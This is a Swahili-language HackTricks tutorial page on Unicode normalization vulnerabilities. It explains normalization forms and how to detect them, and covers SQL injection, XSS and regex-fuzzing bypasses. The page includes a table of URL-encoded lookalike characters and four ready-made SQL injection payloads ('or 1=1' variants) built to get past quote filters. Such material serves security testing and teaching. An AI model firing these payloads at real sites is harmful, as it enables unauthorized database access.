# Ufananishaji wa Unicode

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

**Hii ni muhtasari wa:** [**https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/**](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/). Angalia kwa undani zaidi (picha zilizochukuliwa kutoka hapo).

## Kuelewa Unicode na Ufananuzi

Ufananuzi wa Unicode ni mchakato unaohakikisha uwakilishi tofauti wa kibitibiti wa wahusika unastandadishwa kwa thamani sawa ya kibitibiti. Mchakato huu ni muhimu katika kushughulikia herufi katika programu na usindikaji wa data. Kiwango cha Unicode hufafanua aina mbili za usawa wa wahusika:

1. **Usawa wa Kanoni**: Wahusika wanachukuliwa kuwa sawa kwa kanoni ikiwa wanaonekana na kumaanisha sawa wakati wa kuchapishwa au kuonyeshwa.
2. **Usawa wa Ulinganifu**: Aina dhaifu ya usawa ambapo wahusika wanaweza kuwakilisha kibitibiti kimoja cha kimaanisha lakini wanaweza kuonyeshwa tofauti.

Kuna **algoritimu nne za ufananuzi wa Unicode**: NFC, NFD, NFKC, na NFKD. Kila algoritimu hutumia mbinu tofauti za kanoni na ufananuzi wa uwezo. Kwa uelewa zaidi, unaweza kuchunguza mbinu hizi kwenye [Unicode.org](https://unicode.org/).

### Mambo Muhimu kuhusu Ufananuzi wa Unicode

Kuelewa uandishi wa Unicode ni muhimu, hasa wakati wa kushughulikia masuala ya kuingiliana kati ya mifumo au lugha tofauti. Hapa kuna mambo muhimu:

* **Pointi za Kanuni na Wahusika**: Katika Unicode, kila herufi au alama imepewa thamani ya nambari inayoitwa "pointi ya kanuni".
* **Uwakilishi wa Bayti**: Pointi ya kanuni (au herufi) inawakilishwa na bayti moja au zaidi kumbukani. Kwa mfano, herufi za LATIN-1 (zinazotumiwa sana katika nchi zinazozungumza Kiingereza) zinawakilishwa kwa kutumia bayti moja. Walakini, lugha zenye seti kubwa ya wahusika zinahitaji bayti zaidi kwa uwakilishi.
* **Ukodishaji**: Kauli hii inahusu jinsi wahusika wanavyobadilishwa kuwa mfululizo wa bayti. UTF-8 ni kiwango cha ukodishaji ambapo herufi za ASCII zinawakilishwa kwa kutumia bayti moja, na hadi bayti nne kwa wahusika wengine.
* **Usindikaji wa Data**: Mifumo inayosindika data lazima iwe na ufahamu wa ukodishaji unaotumiwa ili kubadilisha kwa usahihi mfululizo wa bayti kuwa wahusika.
* **Toleo za UTF**: Mbali na UTF-8, kuna viwango vingine vya ukodishaji kama UTF-16 (ikitumia angalau bayti 2, hadi 4) na UTF-32 (ikitumia bayti 4 kwa wahusika wote).

Ni muhimu kufahamu dhana hizi ili kushughulikia kwa ufanisi na kupunguza masuala yanayoweza kutokea kutokana na utata wa Unicode na njia zake mbalimbali za ukodishaji.

Mfano wa jinsi Unicode inavyonormalisha bayti mbili tofauti zinazowakilisha herufi moja sawa:
```python
unicodedata.normalize("NFKD","chloe\u0301") == unicodedata.normalize("NFKD", "chlo\u00e9")
```
**Orodha ya wahusika sawa wa Unicode inaweza kupatikana hapa:** [https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html](https://appcheck-ng.com/wp-content/uploads/unicode\_normalization.html) na [https://0xacb.com/normalization\_table](https://0xacb.com/normalization\_table)

### Kugundua

Ikiwa unaweza kupata ndani ya programu-jalizi ya wavuti thamani ambayo inarudishwa, unaweza kujaribu kutuma **'KELVIN SIGN' (U+0212A)** ambayo **inahamisha kuwa "K"** (unaweza kutuma kama `%e2%84%aa`). **Ikiwa "K" inarudishwa**, basi, aina fulani ya **kawaida ya Unicode** inafanywa.

**Mfano mwingine**: `%F0%9D%95%83%E2%85%87%F0%9D%99%A4%F0%9D%93%83%E2%85%88%F0%9D%94%B0%F0%9D%94%A5%F0%9D%99%96%F0%9D%93%83` baada ya **unicode** ni `Leonishan`.

## **Mifano ya Kudhoofika**

### **Kiwango cha Kufilisika cha SQL Injection**

Fikiria ukurasa wa wavuti ambao unatumia herufi `'` kuunda maswali ya SQL na mchango wa mtumiaji. Wavuti hii, kama hatua ya usalama, **inafuta** matukio yote ya herufi **`'`** kutoka kwa mchango wa mtumiaji, lakini **baada ya kufuta** na **kabla ya uundaji** wa swali, ina **kawaida** kutumia **Unicode** mchango wa mtumiaji.

Kisha, mtumiaji mwenye nia mbaya anaweza kuingiza herufi tofauti ya Unicode inayolingana na `' (0x27)` kama `%ef%bc%87`, wakati mchango unapohamishwa, alama moja ya nukta inaundwa na **kutokuwa na usalama wa SQLInjection** unaonekana:

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (699).png>)

**Baadhi ya wahusika wa Unicode wa kuvutia**

* `o` -- %e1%b4%bc
* `r` -- %e1%b4%bf
* `1` -- %c2%b9
* `=` -- %e2%81%bc
* `/` -- %ef%bc%8f
* `-`-- %ef%b9%a3
* `#`-- %ef%b9%9f
* `*`-- %ef%b9%a1
* `'` -- %ef%bc%87
* `"` -- %ef%bc%82
* `|` -- %ef%bd%9c
```
' or 1=1-- -
%ef%bc%87+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

" or 1=1-- -
%ef%bc%82+%e1%b4%bc%e1%b4%bf+%c2%b9%e2%81%bc%c2%b9%ef%b9%a3%ef%b9%a3+%ef%b9%a3

' || 1==1//
%ef%bc%87+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f

" || 1==1//
%ef%bc%82+%ef%bd%9c%ef%bd%9c+%c2%b9%e2%81%bc%e2%81%bc%c2%b9%ef%bc%8f%ef%bc%8f
```
#### Kigezo cha sqlmap

{% embed url="https://github.com/carlospolop/sqlmap_to_unicode_template" %}

### XSS (Udukuzi wa Msalaba wa Tovuti)

Unaweza kutumia moja ya herufi zifuatazo kudanganya programu ya wavuti na kutumia XSS:

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (312) (2).png>)

Tambua kwamba kwa mfano herufi ya kwanza ya Unicode inayopendekezwa inaweza kutumwa kama: `%e2%89%ae` au kama `%u226e`

![https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/](<../../.gitbook/assets/image (215) (1) (1).png>)

### Fuzzing Regexes

Wakati seva ya nyuma ina **angalia kuingia kwa mtumiaji na regex**, inaweza kuwa inawezekana kwamba **kuingia** ina **kawaida** kwa **regex** lakini **sio** kwa mahali inapotumiwa. Kwa mfano, katika Uelekezaji wa Wazi au SSRF regex inaweza kuwa **kawaida URL iliyotumwa** lakini kisha **kuitumia kama ilivyo**.

Zana [**recollapse**](https://github.com/0xacb/recollapse) inaruhusu **kuzalisha mabadiliko ya kuingia** kufanya fuzzing kwa seva ya nyuma. Kwa habari zaidi angalia **github** na hii [**chapisho**](https://0xacb.com/2022/11/21/recollapse/).

## Marejeo

* [**https://labs.spotify.com/2013/06/18/creative-usernames/**](https://labs.spotify.com/2013/06/18/creative-usernames/)
* [**https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work**](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work)
* [**https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html**](https://jlajara.gitlab.io/posts/2020/02/19/Bypass\_WAF\_Unicode.html)

<details>

<summary><strong>Jifunze udukuzi wa AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
